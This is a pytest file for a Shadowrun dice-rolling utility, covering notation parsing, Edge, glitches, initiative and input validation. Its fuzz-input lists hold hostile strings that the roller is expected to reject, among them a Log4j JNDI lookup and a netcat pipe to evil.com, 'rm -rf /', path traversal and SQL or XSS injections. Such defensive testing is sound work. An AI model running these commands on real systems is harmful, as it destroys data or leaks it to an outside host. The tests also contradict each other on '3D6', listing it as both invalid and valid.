"""
Test edge mechanics, dice rolling, and fuzz inputs
"""
import pytest
from utils.dice_roller import DiceRoller, roll, roll_shadowrun, roll_initiative
from utils.validators import DiceNotationSchema
from pydantic import ValidationError
import random


class TestDiceRoller:
    """Test the safe dice rolling implementation"""
    
    @pytest.fixture
    def roller(self):
        """Create a dice roller instance with fixed seed for predictable tests"""
        roller = DiceRoller()
        roller.random = random.Random(42)  # Fixed seed for reproducible tests
        return roller
    
    def test_basic_dice_notation(self, roller):
        """Test basic dice notation parsing and rolling"""
        # Test simple notation
        result = roller.roll("3d6")
        assert result.num_dice == 3
        assert result.dice_size == 6
        assert result.modifier == 0
        assert len(result.rolls) == 3
        assert all(1 <= r <= 6 for r in result.rolls)
        
        # Test with positive modifier
        result = roller.roll("2d10+5")
        assert result.num_dice == 2
        assert result.dice_size == 10
        assert result.modifier == 5
        assert result.total == sum(result.rolls) + 5
        
        # Test with negative modifier
        result = roller.roll("4d8-2")
        assert result.num_dice == 4
        assert result.dice_size == 8
        assert result.modifier == -2
        assert result.total == sum(result.rolls) - 2
    
    def test_dice_notation_validation(self, roller):
        """Test dice notation validation"""
        # Valid notations
        valid_notations = ["1d6", "20d6", "10d100", "5d12+3", "2d20-1"]
        for notation in valid_notations:
            result = roller.roll(notation)
            assert result is not None
        
        # Invalid notations
        invalid_notations = [
            "21d6",      # Too many dice
            "5d101",     # Dice size too large
            "0d6",       # Zero dice
            "d6",        # Missing number of dice
            "3d",        # Missing dice size
            "3d6+",      # Incomplete modifier
            "abc",       # Not dice notation
            "",          # Empty string
            "3d6+5+2",   # Multiple modifiers
            "3.5d6",     # Decimal dice
        ]
        
        for notation in invalid_notations:
            with pytest.raises(ValueError):
                roller.roll(notation)
    
    def test_emoji_dice_notation(self, roller):
        """Test handling of emoji and unicode in dice notation"""
        emoji_notations = [
            "10d🔥",
            "5d☠️",
            "3d💀",
            "Roll 10d🎲",
            "🎯d6",
            "3d6️⃣"
        ]
        
        for notation in emoji_notations:
            with pytest.raises(ValueError):
                roller.roll(notation)
    
    def test_shadowrun_dice_pool(self, roller):
        """Test Shadowrun-specific dice pool mechanics"""
        # Test basic pool
        result = roller.roll_shadowrun(10)
        assert result['dice_pool'] == 10
        assert len(result['rolls']) == 10
        assert all(1 <= r <= 6 for r in result['rolls'])
        
        # Count hits (5s and 6s)
        expected_hits = sum(1 for r in result['rolls'] if r >= 5)
        assert result['hits'] == expected_hits
        
        # Count ones for glitch detection
        expected_ones = sum(1 for r in result['rolls'] if r == 1)
        assert result['ones'] == expected_ones
        
        # Test glitch detection
        if expected_ones > 5:  # More than half the dice
            assert result['glitch'] is True
    
    def test_edge_exploding_sixes(self, roller):
        """Test Edge mechanic with exploding 6s"""
        # Roll with Edge
        result = roller.roll_shadowrun(5, edge_used=True)
        assert result['edge_used'] is True
        
        # If there were any 6s, we should have more than 5 dice rolled
        original_sixes = sum(1 for r in result['rolls'][:5] if r == 6)
        if original_sixes > 0:
            assert len(result['rolls']) > 5
    
    def test_critical_glitch(self, roller):
        """Test critical glitch detection"""
        # Force a scenario with many 1s and no hits
        # We'll need to mock the random for this specific test
        class MockRandom:
            def randint(self, a, b):
                return 1  # Always roll 1
        
        roller.random = MockRandom()
        result = roller.roll_shadowrun(6)
        
        assert result['ones'] == 6
        assert result['hits'] == 0
        assert result['glitch'] is True
        assert result['critical_glitch'] is True
    
    def test_initiative_rolling(self, roller):
        """Test initiative rolling mechanics"""
        # Basic initiative
        result = roller.roll_initiative(reaction=5, intuition=4)
        assert result['base'] == 9
        assert len(result['dice_rolls']) == 1
        assert result['total'] >= 10  # 9 + at least 1
        
        # Multiple initiative dice
        result = roller.roll_initiative(reaction=6, intuition=5, initiative_dice=3)
        assert result['base'] == 11
        assert len(result['dice_rolls']) >= 3
        
        # With Edge
        result = roller.roll_initiative(reaction=4, intuition=4, edge_used=True)
        assert result['edge_used'] is True
    
    def test_extended_test(self, roller):
        """Test extended test mechanics"""
        # Test successful extended test
        result = roller.roll_extended_test(
            dice_pool=10,
            threshold=8,
            interval="1 hour",
            max_rolls=5
        )
        
        assert 'success' in result
        assert 'total_hits' in result
        assert 'rolls_made' in result
        assert len(result['roll_history']) == result['rolls_made']
        
        # Test with max rolls limit
        result = roller.roll_extended_test(
            dice_pool=3,
            threshold=20,  # Very high threshold
            max_rolls=3
        )
        
        assert result['rolls_made'] <= 3
    
    def test_dice_limits(self, roller):
        """Test dice pool limits"""
        # Valid limits
        roller.roll_shadowrun(1)   # Minimum
        roller.roll_shadowrun(50)  # Maximum
        
        # Invalid limits
        with pytest.raises(ValueError):
            roller.roll_shadowrun(0)   # Too few
        
        with pytest.raises(ValueError):
            roller.roll_shadowrun(51)  # Too many
    
    def test_formatting(self, roller):
        """Test result formatting"""
        # Standard dice
        result = roller.roll("3d6+2")
        formatted = roller.format_roll_result(result)
        assert "3d6+2" in formatted
        assert str(result.total) in formatted
        
        # Shadowrun dice
        sr_result = roller.roll_shadowrun(5)
        formatted = roller.format_shadowrun_result(sr_result)
        assert "5d6" in formatted
        assert str(sr_result['hits']) in formatted


class TestDiceNotationValidator:
    """Test dice notation validation schema"""
    
    def test_valid_notations(self):
        """Test valid dice notations pass validation"""
        valid = ["3d6", "2d10+5", "4d8-2", "1d20", "10d10"]
        
        for notation in valid:
            validated = DiceNotationSchema(notation=notation)
            assert validated.notation == notation.strip()
    
    def test_invalid_notations(self):
        """Test invalid notations are rejected"""
        invalid = [
            "Roll 3d6",          # Extra text
            "3d6 + 2",           # Spaces in wrong places
            "3D6",               # Should handle case
            "10d🎲",            # Emoji
            "eval('3d6')",      # Code injection attempt
            "<script>3d6</script>",  # XSS attempt
            "100d100",          # Too many dice
            "5d1000",           # Dice too large
            "",                 # Empty
            "d6",               # Missing count
            "3d",               # Missing size
            "-3d6",             # Negative dice count
            "3.5d6",            # Decimal
            "3d6.5",            # Decimal size
            "3d6++5",           # Double modifier
            "3d6+-5",           # Conflicting modifiers
        ]
        
        for notation in invalid:
            with pytest.raises(ValidationError):
                DiceNotationSchema(notation=notation)
    
    def test_edge_cases(self):
        """Test edge case dice notations"""
        # Maximum allowed
        DiceNotationSchema(notation="20d100")
        
        # Case insensitive
        validated = DiceNotationSchema(notation="3D6")
        assert validated.notation == "3D6"  # Preserves original case
        
        # With modifiers at limits
        DiceNotationSchema(notation="5d6+99")
        DiceNotationSchema(notation="5d6-99")


class TestFuzzInputs:
    """Test handling of fuzz inputs and edge cases"""
    
    def test_symbolic_commands(self):
        """Test handling of symbolic and special character commands"""
        symbolic_inputs = [
            "!@#$%^&*()",
            "<<<>>>",
            "{{}}[][]",
            "\\\\//\\\\//",
            "~~~```~~~",
            "🎲🎯🔥☠️💀",
            "\x00\x01\x02",  # Null bytes
            "\n\r\t",        # Whitespace chars
            "' OR 1=1 --",   # SQL injection
            "${jndi:ldap://evil.com/a}",  # Log4j style
            "../../../etc/passwd",  # Path traversal
            "%00",           # Null byte injection
            "&#x3C;script&#x3E;",  # HTML entities
        ]
        
        roller = DiceRoller()
        
        for inp in symbolic_inputs:
            with pytest.raises(ValueError):
                roller.roll(inp)
    
    def test_unicode_edge_cases(self):
        """Test unicode handling in dice notation"""
        unicode_inputs = [
            "٣d٦",           # Arabic numerals
            "３ｄ６",         # Full-width characters
            "③d⑥",          # Circled numbers
            "叁d六",         # Chinese numerals
            "ⅢdⅥ",          # Roman numerals
            "๓d๖",           # Thai numerals
            "ʒdϬ",           # Random unicode that looks like numbers
            "𝟑𝐝𝟔",           # Mathematical alphanumeric symbols
        ]
        
        roller = DiceRoller()
        
        for inp in unicode_inputs:
            with pytest.raises(ValueError):
                roller.roll(inp)
    
    def test_broken_markup(self):
        """Test handling of broken markup and malformed input"""
        broken_inputs = [
            "<dice>3d6</dice",         # Unclosed tag
            "[dice]3d6[/dic",          # Broken BBCode
            "{{3d6}",                  # Unmatched braces
            "((3d6)",                  # Unmatched parens
            "3d6/*comment*/",          # Code comments
            "3d6<!--comment-->",       # HTML comments
            "3d6\"; DROP TABLE",       # SQL injection
            "3d6'); alert('xss",       # XSS attempt
            "3d6 && rm -rf /",         # Command injection
            "3d6 | nc evil.com 1234",  # Command injection
        ]
        
        roller = DiceRoller()
        
        for inp in broken_inputs:
            with pytest.raises(ValueError):
                roller.roll(inp)


class TestConcurrentDiceRolls:
    """Test concurrent dice rolling scenarios"""
    
    @pytest.mark.asyncio
    async def test_simultaneous_edge_and_damage(self):
        """Test simultaneous Edge usage and damage rolling"""
        import asyncio
        
        async def roll_with_edge():
            return roll_shadowrun(10, edge_used=True)
        
        async def roll_damage():
            return roll_shadowrun(8, edge_used=False)
        
        # Simulate concurrent rolls
        results = await asyncio.gather(
            roll_with_edge(),
            roll_damage()
        )
        
        edge_result, damage_result = results
        
        # Verify both completed successfully
        assert edge_result['edge_used'] is True
        assert damage_result['edge_used'] is False
        assert len(edge_result['rolls']) >= 10
        assert len(damage_result['rolls']) == 8
    
    def test_rapid_sequential_rolls(self):
        """Test rapid sequential dice rolls don't interfere"""
        results = []
        
        # Simulate rapid clicking
        for i in range(100):
            result = roll(f"{(i % 20) + 1}d6")
            results.append(result)
        
        # Each should be independent
        for i, result in enumerate(results):
            expected_dice = (i % 20) + 1
            assert result.num_dice == expected_dice
            assert len(result.rolls) == expected_dice 